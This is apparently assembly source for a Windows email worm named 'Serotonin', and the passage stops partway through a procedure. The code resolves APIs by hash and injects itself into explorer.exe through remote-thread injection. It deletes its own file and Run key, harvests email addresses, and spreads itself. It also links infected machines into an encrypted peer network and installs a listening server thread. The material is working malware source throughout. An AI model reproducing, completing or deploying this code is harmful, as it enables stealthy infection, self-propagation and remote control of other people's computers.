.486
.model	flat

include	pe.inc
include	cor.inc
include	win32api.inc
include	useful.inc
include	mz.inc
include	consts.inc

.data

	db	?

extrn ExitProcess:PROC


.code

Start:


	;Start of worm's body


	pushad
	@SEH_SetupFrame	<jmp	end_seh>	;__try block

	call	_gdelta				;get delta offset
gdelta:	db	0B8h
_gdelta:pop	eax
	xchg	eax,ebp				;to EBP


	mov	eax,fs:[30h]			;PEB in EAX
	test	eax,eax
	js	end_seh				;quit if not on WinNT
	mov	eax,[eax+0ch]
	mov	esi,[eax+1ch]			;1st loaded module
	lodsd
	mov	eax,[eax+8]			;base of kernel32.dll in EAX
						;(kisses to Ratter/29A ;-)

	call	get_apiz			;find addresses of APIz


	;HeapFree API in kernel32.dll is forwarded to NTDLL.RtlFreeHeap API

	mov	esi,[ebp + _GetModuleHandleA - gdelta]
	mov	edi,[ebp + _GetProcAddress - gdelta]
	@pushsz	'NTDLL'
	call	esi
	test	eax,eax				;get base address of NTDLL.DLL
	je	end_seh
	xchg	eax,ebx
	@pushsz	'RtlFreeHeap'
	push	ebx				;find address of RtlFreeHeap API
	call	edi
	mov	[ebp + _HeapFree - gdelta],eax
						;save it
	call	psapi_apiz			;find addresses of PSAPI.dll APIz


mutexName = $+5
	@pushsz	'$serotonin@'			;mutex name
	push	0
	push	1
	mov	eax,12345678h
_OpenMutexA = dword ptr $-4
	call	eax				;open worm mutex
	test	eax,eax
	jne	end_seh				;quit if already installed

	lea	eax,[ebp + filename - gdelta]
	push	MAX_PATH
	push	eax
	push	0
	mov	eax,12345678h
_GetModuleFileNameA = dword ptr $-4
	call	eax				;get worm's filename

	call	mutate				;mutate some variables

	lea	esi,[ebp + procz - gdelta]
	lea	eax,[ebp + tmp - gdelta]
	push	eax
	push	100h
	push	esi
	mov	eax,12345678h
_EnumProcesses = dword ptr $-4
	call	eax				;enumerate all running processes
	dec	eax
	jne	end_seh
	add	esi,4

p_search:
	lodsd					;get PID
	test	eax,eax
	je	end_ps
	call	analyse_process			;and try to infect it
ps_patch:
	jmp	p_search

end_ps:	push	12345678h
_psapi = dword ptr $-4
	mov	esi,12345678h
_FreeLibrary = dword ptr $-4
	call	esi				;free PSAPI.dll



end_seh:@SEH_RemoveFrame			;__except block
	popad
	ret					;and quit






mutate	Proc
	push	3
	call	get_rnd				;get random number <0..2>
	dec	edx
	je	next_variable1
	dec	edx
	je	sub1
	call	get_rnd6			;get random number <0..5>
	add	[ebp + mut_mailnum - gdelta],edx;increment variable
	jmp	next_variable2
sub1:	call	get_rnd6			;get random number <0..5>
	sub	[ebp + mut_mailnum - gdelta],edx;decrement variable

next_variable1:					; ----- " " -----
	push	3
	call	get_rnd
	dec	edx
	je	next_variable2
	dec	edx
	je	sub2
	push	1000
	call	get_rnd
	add	[ebp + mut_sleep_time - gdelta],edx
	jmp	next_variable2
sub2:	push	1000
	call	get_rnd
	sub	[ebp + mut_sleep_time - gdelta],edx

next_variable2:					; ----- " " -----
	push	3
	call	get_rnd
	dec	edx
	je	next_variable3
	dec	edx
	je	sub3
	call	get_rnd6
	add	[ebp + mut_ipsnum - gdelta],edx
	jmp	next_variable3
sub3:	call	get_rnd6
	sub	[ebp + mut_ipsnum - gdelta],edx

next_variable3:
	push	3
	call	get_rnd
	dec	edx
	je	next_variable4
	dec	edx
	je	sub4
	call	get_rnd6
	add	[ebp + mut_clientnum - gdelta],edx
	jmp	next_variable4
sub4:	call	get_rnd6
	sub	[ebp + mut_clientnum - gdelta],edx

next_variable4:
	push	3
	call	get_rnd
	dec	edx
	je	next_variable5
	dec	edx
	je	sub5
	call	get_rnd6
	add	[ebp + mut_time - gdelta],edx
	jmp	next_variable5
sub5:	call	get_rnd6
	sub	[ebp + mut_time - gdelta],edx

next_variable5:
	push	2
	call	get_rnd				;get random number <0..1>
	dec	edx
	je	end_mutate
	push	2				; ----- " " -----
	call	get_rnd
	mov	[ebp + mut_nonstop_traffic - gdelta],edx
end_mutate:					;write variable
	ret



;get random number <0..5>

get_rnd6:
	push	6
	call	get_rnd
	ret



;get random number <0..[esp+4]>

get_rnd:dw	310Fh				;RDTCS
	xor	edx,edx
	mov	ecx,[esp+4]
	div	ecx
	ret	4				;result in EDX
mutate	EndP






;retrieves all needed API addresses from KERNEL32.dll

get_apiz	Proc
	mov	esi,eax			;base of K32
	mov	edx,[esi.MZ_lfanew]
	add	edx,esi
	mov	ebx,[edx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add	ebx,esi
	mov	ecx,[ebx.ED_NumberOfNames]
	mov	edx,[ebx.ED_AddressOfNames]
	add	edx,esi

	xor	eax,eax
c_find:	pushad
	add	esi,[edx+eax*4]
	push	esi
	@endsz
	mov	edi,esi
	pop	esi
	sub	edi,esi
	call	CRC32			;calculate CRC32 of the API

	push	n_apiz			;number of apiz
	pop	ecx

	call	@callz
s_apiz:	dd	04134D1ADh		;LoadLibraryA
	dd	0AFDF191Fh		;FreeLibrary
	dd	0FFC97C1Fh		;GetProcAddress
	dd	033D350C4h		;OpenProcess
	dd	068624A9Dh		;CloseHandle
	dd	0DA89FC22h		;VirtualAllocEx
	dd	00E9BBAD5h		;WriteProcessMemory
	dd	0CF4A7F65h		;CreateRemoteThread
	dd	0700ED6DFh		;VirtualFreeEx
	dd	0C6F22166h		;OpenMutexA
	dd	020B943E7h		;CreateMutexA
	dd	00AC136BAh		;Sleep
	dd	079C3D4BBh		;VirtualProtect
	dd	0058F9201h		;ExitThread
	dd	02AAD1211h		;VirtualFree
	dd	004DCF392h		;GetModuleFileNameA
	dd	0DE256FDEh		;DeleteFileA
	dd	082B618D4h		;GetModuleHandleA
	dd	04402890Eh		;VirtualAlloc
	dd	0E141042Ah		;GetProcessHeap
	dd	019F33607h		;CreateThread
	dd	0D4540229h		;WaitForSingleObject
	dd	0613FD7BAh		;GetTickCount
	dd	0593AE7CEh		;GetSystemDirectoryA

n_apiz = ($-s_apiz)/4
@callz:	pop	edx

c_look:	cmp	[edx-4+(ecx*4)],eax	;is it our API?
	je	got_call		;yeah
	loop	c_look			;nope, look for another API in our table
c_out:	popad
	inc	eax
	dec	ecx
	jecxz	c_over
	jmp	c_find
c_over:	ret

got_call:
	mov	edx,[ebx.ED_AddressOfOrdinals]
	mov	esi,[esp.Pushad_esi]
	add	edx,esi
	mov	eax,[esp.Pushad_eax]
	movzx	eax,word ptr [edx+eax*2]
	mov	edx,esi
	add	edx,[ebx.ED_AddressOfFunctions]
	mov	eax,[edx+eax*4]
	add	eax,esi

	lea	edx,[ebp + Start - gdelta]
	add	edx,[ebp + api_addr-4+ecx*4 - gdelta]
	mov	[edx],eax		;save it
	jmp	c_out
get_apiz	EndP

api_addr:				;where to save addresses of APIz...
	dd	offset _LoadLibraryA-Start
	dd	offset _FreeLibrary-Start
	dd	offset _GetProcAddress-Start
	dd	offset _OpenProcess-Start
	dd	offset _CloseHandle-Start
	dd	offset _VirtualAllocEx-Start
	dd	offset _WriteProcessMemory-Start
	dd	offset _CreateRemoteThread-Start
	dd	offset _VirtualFreeEx-Start
	dd	offset _OpenMutexA-Start
	dd	offset _CreateMutexA-Start
	dd	offset _Sleep-Start
	dd	offset _VirtualProtect-Start
	dd	offset _ExitThread-Start
	dd	offset _VirtualFree-Start
	dd	offset _GetModuleFileNameA-Start
	dd	offset _DeleteFileA-Start
	dd	offset _GetModuleHandleA-Start
	dd	offset _VirtualAlloc-Start
	dd	offset _GetProcessHeap-Start
	dd	offset _CreateThread-Start
	dd	offset _WaitForSingleObject-Start
	dd	offset _GetTickCount-Start
	dd	offset _GetSystemDirectoryA-Start



;procedure for calculating CRC32s at run-time

CRC32:	push	ecx
	push	edx
	push	ebx
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret






;retrieves all needed API addresses from ADVAPI32.dll

crypt32_apiz	Proc
	@pushsz	'ADVAPI32'		;get address of ADVAPI32 .dll
	call	[ebp + _GetModuleHandleA - tgdelta]
	xchg	eax,ebx			;to EBX

	@pushsz	'CryptAcquireContextA'
	push	ebx
	mov	esi,[ebp + _GetProcAddress - tgdelta]
	call	esi
	mov	[ebp + _CryptAcquireContextA - tgdelta],eax
					;save API address
	@pushsz	'CryptGenKey'
	push	ebx
	call	esi
	mov	[ebp + _CryptGenKey - tgdelta],eax
					;--- " " ---
	@pushsz	'CryptDestroyKey'
	push	ebx
	call	esi
	mov	[ebp + _CryptDestroyKey - tgdelta],eax
					;--- " " ---
	@pushsz	'CryptImportKey'
	push	ebx
	call	esi
	mov	[ebp + _CryptImportKey - tgdelta],eax
					;--- " " ---
	@pushsz	'CryptExportKey'
	push	ebx
	call	esi
	mov	[ebp + _CryptExportKey - tgdelta],eax
					;--- " " ---
	@pushsz	'CryptEncrypt'
	push	ebx
	call	esi
	mov	[ebp + _CryptEncrypt - tgdelta],eax
					;--- " " ---
	@pushsz	'CryptDecrypt'
	push	ebx
	call	esi
	mov	[ebp + _CryptDecrypt - tgdelta],eax
					;--- " " ---
	@pushsz	'CryptReleaseContext'
	push	ebx
	call	esi
	mov	[ebp + _CryptReleaseContext - tgdelta],eax
					;--- " " ---
	ret
crypt32_apiz	EndP



;retrieves all needed API addresses from WSOCK32.dll

wsock32_api	Proc
	@pushsz	'WSOCK32'
	call	[ebp + _LoadLibraryA - tgdelta]
	xchg	eax,ebx			;load WSOCK32.dll
	mov	[ebp + _wsock32 - tgdelta],ebx

	@pushsz	'WSAStartup'
	push	ebx
	mov	esi,[ebp + _GetProcAddress - tgdelta]
	call	esi
	mov	[ebp + _WSAStartup - tgdelta],eax
					;save API address
	@pushsz	'socket'
	push	ebx
	call	esi
	mov	[ebp + _socket - tgdelta],eax
					;--- " " ---
	@pushsz	'connect'
	push	ebx
	call	esi
	mov	[ebp + _connect - tgdelta],eax
					;--- " " ---
	@pushsz	'recv'
	push	ebx
	call	esi
	mov	[ebp + _recv - tgdelta],eax
					;--- " " ---
	@pushsz	'send'
	push	ebx
	call	esi
	mov	[ebp + _send - tgdelta],eax
					;--- " " ---
	@pushsz	'bind'
	push	ebx
	call	esi
	mov	[ebp + _bind - tgdelta],eax
					;--- " " ---
	@pushsz	'listen'
	push	ebx
	call	esi
	mov	[ebp + _listen - tgdelta],eax
					;--- " " ---
	@pushsz	'accept'
	push	ebx
	call	esi
	mov	[ebp + _accept - tgdelta],eax
					;--- " " ---
	@pushsz	'gethostname'
	push	ebx
	call	esi
	mov	[ebp + _gethostname - tgdelta],eax
					;--- " " ---
	@pushsz	'gethostbyname'
	push	ebx
	call	esi
	mov	[ebp + _gethostbyname - tgdelta],eax
					;--- " " ---
	@pushsz	'closesocket'
	push	ebx
	call	esi
	mov	[ebp + _closesocket - tgdelta],eax
					;--- " " ---
	@pushsz	'WSACleanup'
	push	ebx
	call	esi
	mov	[ebp + _WSACleanup - tgdelta],eax
					;--- " " ---
	ret
wsock32_api	EndP



;retrieves all needed API addresses from PSAPI.dll

psapi_apiz	Proc
	@pushsz	'PSAPI'
	mov	eax,12345678h
_LoadLibraryA = dword ptr $-4
	call	eax			;load PSAPI.dll
	xchg	eax,ebx
	mov	[ebp + _psapi - gdelta],ebx
	@pushsz	'EnumProcesses'
	push	ebx
	mov	esi,12345678h
_GetProcAddress = dword ptr $-4
	call	esi
	mov	[ebp + _EnumProcesses - gdelta],eax
					;save API address
	@pushsz	'EnumProcessModules'
	push	ebx
	call	esi
	mov	[ebp + _EnumProcessModules - gdelta],eax
					;--- " " ---
	@pushsz	'GetModuleBaseNameA'
	push	ebx
	call	esi
	mov	[ebp + _GetModuleBaseNameA - gdelta],eax
	ret				;--- " " ---
psapi_apiz	EndP






;analyses running process, searches for explorer.exe and implants there worm body

analyse_process	Proc
	pushad
	push	eax
	push	0
	push	43Ah
	mov	eax,12345678h
_OpenProcess = dword ptr $-4
	call	eax				;PID -> handle
	test	eax,eax
	je	end_ap
	mov	[ebp + hProcess - gdelta],eax
	push	eax				;save handle to stack *

	push	eax
	lea	esi,[ebp + modz - gdelta]
	lea	ecx,[ebp + tmp - gdelta]
	push	ecx
	push	4
	push	esi
	push	eax
	mov	eax,12345678h
_EnumProcessModules = dword ptr $-4
	call	eax				;get first (main) module
	pop	ecx
	dec	eax
	jne	end_ap1

	lodsd
	mov	[ebp + module_base - gdelta],eax
	lea	esi,[ebp + mod_name - gdelta]
	push	MAX_PATH
	push	esi
	push	eax
	push	ecx
	mov	eax,12345678h
_GetModuleBaseNameA = dword ptr $-4
	call	eax				;get its name
	xchg	eax,ecx
	test	ecx,ecx
	je	end_ap1

	@pushsz	'explorer.exe'
	pop	edi
	call	lowercase
	pushad
	rep	cmpsb
	popad
	jne	end_ap1

	lea	esi,[ebp + Start - gdelta]
	mov	edi,_virtual_end-Start
virtual_end = dword ptr $-4

	push	PAGE_READWRITE
	push	MEM_RESERVE
	push	4000000h
	push	0
	push	12345678h
hProcess = dword ptr $-4
	mov	ebx,12345678h
_VirtualAllocEx = dword ptr $-4
	call	ebx				;reserve 64MB of memory for worm
	test	eax,eax				; ( more memory may be allocated
	je	end_ap1				;at runtime )

        push	PAGE_READWRITE
	push	MEM_COMMIT
	push	edi
	push	eax
	push	dword ptr [ebp + hProcess - gdelta]
	call	ebx				;aloc memory for worm
	test	eax,eax
	je	end_ap1
	xchg	eax,ebx
	mov	[ebp + worm_base - gdelta],ebx
						;save address
	push	0
	push	edi
	push	esi
	push	ebx
	push	dword ptr [ebp + hProcess - gdelta]
	mov	eax,12345678h
_WriteProcessMemory = dword ptr $-4
	call	eax				;write there our code
	dec	eax
	jne	free_mem

	mov	word ptr [ebp + ps_patch - gdelta],9090h
						;patch short jump with 2 NOPs
	sub	ebx,Start-rtStart
	xor	edx,edx
	push	edx
	push	edx
	push	edx
	push	ebx
	push	edx
	push	edx
	push	dword ptr [ebp + hProcess - gdelta]
	mov	eax,12345678h
_CreateRemoteThread = dword ptr $-4
	call	eax				;run remote thread!
	push	eax
	call	[ebp + _CloseHandle - gdelta]
	jmp	end_ap1



;make string lowercase proc

lowercase:
	pushad
c_lc:	lodsb
	test	al,al
	je	e_lc
	or	byte ptr [esi-1],20h
	jmp	c_lc
e_lc:	popad
	ret



;free allocated memory

free_mem:
	push	MEM_RELEASE
	push	0
	push	ebx
	push	dword ptr [ebp + hProcess - gdelta]
	mov	eax,12345678h
_VirtualFreeEx = dword ptr $-4
	call	eax				;deallocate memory



;and quit

end_ap1:mov	eax,12345678h
_CloseHandle = dword ptr $-4
	call	eax				;close process handle *
end_ap:	popad
	ret					;and quit
analyse_process	EndP






;read 5 bytez from the socket

get_response5:
	mov	ecx,5				;ECX = 5
	call	@response
response	db	5 dup (?)
@response:
	pop	edi				;EDI = 5-bytes long buffer



;read ECX bytez to EDI PTR buffer

get_response:
	push	0
	push	ecx
	push	edi
	push	12345678h
hSocket = dword ptr $-4
	mov	eax,12345678h
_recv = dword ptr $-4				;get response from worm
	call	eax
	cmp	eax,5
	jb	err_gr
	inc	eax
	je	err_gr
	dec	eax
	clc					;CF=0, everything OK
	ret
err_gr:	stc					;CF=1, error occured
	ret



;send ECX bytez from ESI PTR buffer via socket

write_socket:
	push	0
	push	ecx
	push	esi
	push	dword ptr [ebp + hSocket - tgdelta]
	mov	eax,12345678h
_send = dword ptr $-4
	call	eax
	ret



;allocatez one page in worm's memory, EDI = address of page

alloc_page:
	pushad
	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	1000h
	push	edi				;EDI = uncommitted page to commit
	mov	eax,12345678h
_VirtualAlloc = dword ptr $-4
	call	eax				;allocate another 4096 bytez for worm body
	popad
	ret



;allocatez memory, size given by ECX, ZF set on error

alloc_memory:
	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	ecx
	push	0
	call	[ebp + _VirtualAlloc - tgdelta]
	test	eax,eax				;ZF=1, error occured
	ret					;ZF=0, everything OK



;deallocatez allocated memory, ptr given by EAX

dealloc_memory:
	push	MEM_RELEASE
	push	0
	push	eax
	call	[ebp + _VirtualFree - tgdelta]
	ret






;--------------------------------------------
;
;PROCEDURE	activate_gen
;
;
;INPUT:
;	[ESP+4]	-	genotype type
;
;OUTPUT:
;	EAX	-	result
;
;--------------------------------------------


;callz genotype code, input in stack: genotype type

activate_gen	Proc
	push	ebp
	call	ggdelta				;get delta offset
ggdelta:pop	ebp				;(used by both of client & server)

gen_start:
	lea	esi,[ebp + GENOTYPE - ggdelta]	;get ptr to genotype
	lodsd					;get count of genz
	xchg	eax,ecx				;to ECX
gen_loop:
	push	ecx
	lodsb					;get type of gen
	cmp	al,[esp+12]			;compare it with argument
	jne	next_gen			;get next if not match
	dw	310Fh				;RDTCS
	xor	edx,edx				;EDX=0
	push	3
	pop	ecx				;ECX=3
	div	ecx				;EDX = rnd <0..2>
	dec	edx				;decrement EDX
	pop	ecx				;restore counter
	je	ag_dispatch			;call code if EDX=0
n_gen:	add	esi,8				;get to next gen
	loop	gen_loop			;...
	jmp	gen_start			;already passed down, start at beginning
next_gen:
	pop	ecx				;restore counter
	jmp	n_gen				;and continue...

ag_dispatch:
	lodsd					;get relative ptr to code
	lea	eax,[ebp + GENOTYPE + eax - ggdelta]	;normalize
	mov	esi,12345678h			;ESI - ptr to GMHA
_GetModuleHandleA = dword ptr $-4
	mov	edi,[ebp + _GetProcAddress - ggdelta]	;EDI - ptr to GPA
	call	eax				;dispatch genotype code
	pop	ebp				;restore EBP
	ret	4				;and quit (result is in EAX)
activate_gen	EndP






;here starts implanted code which operatez in EXPLORER.EXE's address space

rtStart	Proc
	pushad
	@SEH_SetupFrame	<jmp	end_seh>	;__try block

	call	tgdelta				;get delta offset
tgdelta:pop	ebp				;to EBP

	lea	eax,[ebp + mutexName - tgdelta]
	push	eax
	push	0
	push	0
	mov	eax,12345678h
_CreateMutexA = dword ptr $-4			;set already-infected mark
	call	eax				;(create named mutex)

	push	60000
mut_sleep_time = dword ptr $-4			;mutable variable
	mov	eax,12345678h
_Sleep = dword ptr $-4
	call	eax				;wait 10 minutez

	lea	eax,[ebp + filename - tgdelta]
	push	eax
	mov	eax,12345678h
_DeleteFileA = dword ptr $-4
	call	eax				;delete worm file

	@pushsz	'SHLWAPI'
	call	[ebp + _GetModuleHandleA - tgdelta]
	test	eax,eax				;get base address of SHLWAPI.DLL
	je	end_seh
	@pushsz	'SHDeleteValueA'
	push	eax				;get address of SHDeleteValueA API
	call	[ebp + _GetProcAddress - tgdelta]

	@pushsz	'Serotonin'
	@pushsz	'Software\Microsoft\Windows\CurrentVersion\Run'
	push	80000001h
	call	eax				;delete registry record



	push	GEN_INITWORM			;activate initialization procedure
	call	activate_gen			;stored in worm genotype

	;create RSA private/public key pair

	call	wsock32_api			;get WSOCK32.dll API addresses
	call	crypt32_apiz			;get all needed crypto API addresses
	call	crypt_create_context		;initialize crypt32.dll
	jc	install_server			;quit if error



	;Find email addresses and store them in EXPLORER.EXE's heap

	push	GEN_FINDVICTIMS			;activate victim-search engine
	call	activate_gen			;stored in worm genotype
	test	eax,eax
	je	install_server			;quit if error occured
	mov	[ebp + heap_emailz - tgdelta],eax
						;save address of heap ( email addresses
						;are stored there )
	;Initialize windows socketz

	call	wsa_startup			;initialize WSOCK32.DLL
	jne	crypt32_destroy_worm
	call	create_socket			;create socket
	je	wsa_destroy_worm		;quit if error
	dec	eax				;correct socket handle
	mov	[ebp + hSocket - tgdelta],eax	;save it


	;Find another worm in Internet

	push	GEN_FINDWORM
	call	activate_gen			;IPs found via genotype
	test	eax,eax
	jne	connect_worm			;we got IP

	;Get pointer to IP storage (2nd part of manifest) and check it

	lea	eax,[ebp + MANIFEST - tgdelta]
	mov	esi,eax
	add	esi,[eax.MAN_IPSPTR]
	mov	ecx,[eax.MAN_IPSNUM]
ip_loop:lodsd					;get IP to EAX
	mov	[ebp + socket_address - tgdelta],eax
	push	ecx
	push	sizeofsocket
	lea	eax,[ebp + socket - tgdelta]
	push	eax
	push	dword ptr [ebp + hSocket - tgdelta]
	call	[ebp + _connect - tgdelta]
	pop	ecx				;try to connect
	test	eax,eax
	je	got_ip
	loop	ip_loop				;disconnected, try another IP



	;No IP infected, create new worm, spread it and install worm server

	call	@ebx
	dd	?
	dd	?
	dd	?
@ebx:	pop	ebx
	mov	eax,[ebp + worm_base - tgdelta]
	mov	[ebx+8],eax
	lea	esi,[ebp + MANIFEST - tgdelta]
	mov	[ebx+4],esi
	mov	eax,[esi+4]
	imul	eax,4
	add	eax,[esi]
	mov	[ebx],eax
	push	GEN_CREATEWORM
	call	activate_gen			;create new worm
	call	spread_the_worm			;spread it
	jmp	socket_destroy_worm		;and install server



;spread the worm by genotype code and delete worm file

spread_the_worm:
	mov	ebx,12345678h
heap_emailz = dword ptr $-4
	push	GEN_SPREADWORM
	call	activate_gen
	ret



;connect to infected IP

connect_worm:
	mov	[ebp + socket_address - tgdelta],eax
						;save the IP

	;Connect to server and authentificate via RSA

	push	sizeofsocket
	lea	eax,[ebp + socket - tgdelta]
	push	eax
	push	dword ptr [ebp + hSocket - tgdelta]
	mov	eax,12345678h
_connect = dword ptr $-4
	call	eax				;connect to worm
	test	eax,eax
	jne	socket_destroy_worm		;quit if error



got_ip:	call	export_key
	jne	socket_destroy_worm		;quit if error

	mov	ecx,[ebp + pubkey_size - tgdelta]
	lea	esi,[ebp + protocol_MAGIC - tgdelta]
	mov	byte ptr [esi],WORMNET_SENDKEY
	mov	[esi+1],ecx
	add	ecx,5
	call	write_socket			;send public key to worm
	call	get_response5			;get response
	jc	socket_destroy_worm

	cmp	byte ptr [edi],WORMNET_SENDKEY
	jne	socket_destroy_worm		;must be WORMNET_SENDKEY
	mov	ecx,[edi+1]
	cmp	ecx,96
	jb	socket_destroy_worm		;key must be > 96 bytez
	mov	eax,1000h
	cmp	eax,ecx
	jb	socket_destroy_worm		;but < 4096 bytez

	mov	ebx,ecx
	call	alloc_memory			;allocate memory for new key
	je	socket_destroy_worm
	mov	[ebp + key_mem - tgdelta],eax
	xchg	eax,edi
	call	get_response			;recieve public key
	jc	socket_destroy_worm

	call	import_key
	jne	socket_destroy_worm		;quit if error

	mov	eax,12345678h
key_mem = dword ptr $-4
	call	dealloc_memory			;deallocate memory



	;encrypt worm's genotype and store it in buffer

	mov	eax,[ebp + MANIFEST.MAN_IPSPTR - tgdelta]
	sub	eax,8
	push	eax
	imul	eax,80h				;80h = encrypted text block size
	push	75h
	pop	ecx				;ECX = plain text block size
	cdq
	div	ecx				;size of buffer for encryption
	xchg	eax,ecx				;in ECX
	call	alloc_memory			;allocate memory for buffer
	pop	ecx
	je	key_destroy_worm
	mov	[ebp + mem_genotype - tgdelta],eax
	xchg	eax,edi				;save address of buffer

	and	dword ptr [ebp + gen_size - tgdelta],0
	push	75h
	pop	ebx				;EBX = plain text block size
	lea	esi,[ebp + GENOTYPE - tgdelta]	;ESI = start of genotype in memory
crypt_loop:
	push	ecx
	push	ecx
	push	edi
	cmp	ecx,ebx
	jb	o_crypt_var
	mov	ecx,ebx
o_crypt_var:
	rep	movsb				;copy plaintext over the buffer
	pop	edi
	pop	ecx
	cmp	ecx,ebx
	jb	crypt_final			;is it last block?
	je	crypt_final

	call	crypt_encrypt			;encrypt one block
	pop	ecx
	mov	eax,[ebp + tmp - tgdelta]
	add	edi,eax
	sub	ecx,ebx
	add	[ebp + gen_size - tgdelta],eax
	jmp	crypt_loop			;correct variablez and continue



;encrypt the last block

crypt_final:
	pop	ecx
	call	crypt_encrypt_final

	mov	ecx,12345678h
gen_size = dword ptr $-4
	add	ecx,[ebp + tmp - tgdelta]
						;ECX = size of encrypted genotype

	push	ecx
	lea	esi,[ebp + protocol_MAGIC - tgdelta]
	mov	byte ptr [esi],WORMNET_SENDGENOTYPE
	mov	[esi+1],ecx
	push	5
	pop	ecx
	call	write_socket			;send header to worm
	mov	esi,12345678h
mem_genotype = dword ptr $-4
	pop	ecx
	call	write_socket			;send genotype to worm
	mov	eax,esi
	call	dealloc_memory
	call	get_response5			;get response
	jc	key_destroy_worm

	cmp	byte ptr [edi],WORMNET_SENDMANIFEST
	jne	key_destroy_worm		;must be WORMNET_SENDMANIFEST

	mov	ecx,[edi+1]
	mov	ebx,ecx

	call	alloc_memory			;allocate memory for manifest
	je	key_destroy_worm
	mov	[ebp + mem_manifest - tgdelta],eax
	xchg	eax,edi
	push	ecx
	call	get_response			;recieve manifest
	pop	ecx
	jc	key_destroy_worm



	;Decrypt manifest stored in encrypted blocks

	mov	ecx,ebx
	and	dword ptr [ebp + man_size - tgdelta],0
	push	80h
	pop	ebx
	mov	esi,edi
decrypt_loop:
	pushad
	mov	ecx,80h
	rep	movsb				;copy encrypted text over the buffer
	popad
	push	ecx
	cmp	ecx,ebx
	je	decrypt_final			;is it last block?

	call	crypt_decrypt
	pop	ecx
	push	75h
	pop	eax
	sub	ecx,ebx
	add	edi,eax
	add	esi,ebx
	add	[ebp + man_size - tgdelta],eax
	jmp	decrypt_loop			;correct variablez and continue



;decrypt last block

decrypt_final:
	pop	ecx
	call	crypt_decrypt_final
	mov	ecx,12345678h
man_size = dword ptr $-4
	add	ecx,[esi]			;ECX = size of decrypted manifest


	;implant new manifest into worm body

	pushad
	mov	esi,[ebp + mem_manifest - tgdelta]
						;ESI = decrypted manifest
	lea	edi,[ebp + MANIFEST - tgdelta]	;EDI = address of worm's manifest
	mov	ecx,[esi.MAN_IPSPTR]		;get pointer to IP storage
	mov	eax,[esi.MAN_IPSNUM]		;get count of IPs
	imul	eax,4				;multiply by IP address size
	add	ecx,eax				;ECX = size of new manifest

	call	copy_manifest			;replace old manifest with the new one

	popad

	mov	eax,ecx				;EAX = size of new manifest
	add	eax,MANIFEST-Start		;add size of code placed before the manifest
	mov	[ebp + virtual_end - tgdelta],eax
						;correct size of worm body
	;create new worm

	call	@man_size_address
	dd	?				;1st param - size of manifest
	dd	12345678h			;2nd param - address of manifest
mem_manifest = dword ptr $-4
	dd	?				;3rd param - address of worm
@man_size_address:
	pop	ebx				;EBX = register holding parameters
	mov	[ebx],ecx
	mov	eax,[ebp + worm_base - tgdelta]
	mov	[ebx+8],eax			;set parameters
	push	GEN_CREATEWORM
	call	activate_gen			;create new worm


	;spread the worm

	call	spread_the_worm
	mov	[ebp + num_of_emailz - tgdelta],eax


	;deallocate heap memory allocated for email addresses

	mov	eax,12345678h
_GetProcessHeap = dword ptr $-4
	call	eax				;get handle to default process's heap
	push	ebx
	push	0
	push	eax
	mov	eax,12345678h
_HeapFree = dword ptr $-4
	call	eax				;deallocate heap memory


	;send report to worm

	call	@report
num_of_emailz	dd	?			;1st param - number of email addresses
num_of_IPz	dd	?			;2nd param - number of IPs in IP storage
		db	80h-8 dup (?)		;block padding
@report:pop	edi
	mov	ecx,[ebp + MANIFEST.MAN_IPSNUM - tgdelta]
	mov	[edi.REP_IPSNUM],ecx

	lea	eax,[ebp + tmp - tgdelta]
	mov	dword ptr [eax],75h
	push	80h
	push	eax
	push	edi
	push	0
	push	1
	push	0
	push	dword ptr [ebp + cXchgKey - tgdelta]
	call	[ebp + _CryptEncrypt - tgdelta]
						;encrypt report

	lea	esi,[ebp + protocol_MAGIC - tgdelta]
	mov	byte ptr [esi],WORMNET_SENDREPORT
	mov	dword ptr [esi+1],80h
	push	5
	pop	ecx
	call	write_socket			;send header to worm
	mov	esi,edi
	mov	ecx,80h
	call	write_socket			;send report to worm

	mov	byte ptr [esi],WORMNET_DISCONNECT
	xor	ecx,ecx
	inc	ecx
	call	write_socket			;send disconnection signal

	mov	eax,[ebp + mem_manifest - tgdelta]
	call	dealloc_memory			;deallocate memory used by manifest

key_destroy_worm:
	push	dword ptr [ebp + cXchgKey - tgdelta]
	call	[ebp + _CryptDestroyKey - tgdelta]
						;destroy key used for encryption
socket_destroy_worm:
	push	dword ptr [ebp + hSocket - tgdelta]
	mov	eax,12345678h
_closesocket = dword ptr $-4
	call	eax				;close socket

wsa_destroy_worm:
	mov	eax,12345678h
_WSACleanup = dword ptr $-4
	call	eax				;unitialize WSOCK32.DLL

crypt32_destroy_worm:
	push	dword ptr [ebp + cKey - tgdelta]
	mov	eax,12345678h
_CryptDestroyKey = dword ptr $-4
	call	eax				;destroy key pair

	push	0
	push	dword ptr [ebp + cProvider - tgdelta]
	mov	eax,12345678h
_CryptReleaseContext = dword ptr $-4
	call	eax				;release crypto context



;install server on infected computer and call custom routine

install_server:
	xor	eax,eax
	lea	ecx,[ebp + ServerThread - tgdelta]
	push	eax
	push	eax
	push	ebp
	push	ecx
	push	eax
	push	eax
	mov	eax,12345678h
_CreateThread = dword ptr $-4
	call	eax				;create server thread
	test	eax,eax
	je	destroy_worm
	xchg	eax,ebx




	push	GEN_CUSTOM			;activate custom routine stored
	call	activate_gen			;in genotype



	push	-1
	push	ebx
	mov	eax,12345678h
_WaitForSingleObject = dword ptr $-4
	call	eax				;wait for its termination

	push	ebx
	call	[ebp + _CloseHandle - tgdelta]	;close thread handle

	push	12345678h
_wsock32 = dword ptr $-4
	call	[ebp + _FreeLibrary - tgdelta]	;unload WSOCK32.DLL


	lea	edi,[ebp + filename - tgdelta]
	push	edi
	push	MAX_PATH-14
	push	edi
	mov	eax,12345678h
_GetSystemDirectoryA = dword ptr $-4
	call	eax
	add	edi,eax
